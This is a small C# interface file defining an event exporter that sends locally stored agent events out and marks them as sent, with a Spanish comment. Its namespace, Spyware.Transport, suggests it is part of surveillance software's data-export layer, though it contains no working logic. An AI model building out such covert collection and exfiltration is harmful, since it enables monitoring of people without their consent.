namespace Spyware.Transport;

/// <summary>
/// Un exportador duplica eventos ya almacenados localmente. El primario
/// (índice 0) es el que autoriza marcar sent = 1.
/// </summary>
public interface IEventExporter
{
    string Name { get; }

    bool Export(string agentId, IReadOnlyList<IReadOnlyDictionary<string, object?>> events);
}
